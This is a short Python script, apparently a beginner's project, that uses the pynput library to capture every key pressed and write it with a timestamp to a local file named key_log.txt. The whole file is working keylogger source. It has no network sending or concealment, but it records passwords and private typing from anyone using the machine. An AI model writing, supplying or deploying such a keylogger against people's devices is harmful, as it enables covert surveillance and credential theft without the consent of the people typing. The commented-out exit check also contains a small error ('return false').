from pynput.keyboard import Key, Listener

#if file has no name it gets put into an empty string
import logging

#make a log file
log_dir = ""

#This is a basic logging function
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))
    #if key == Key.esc:
        #return false

#this says, listner is on
with Listener(on_press=on_press) as listener:
    listener.join()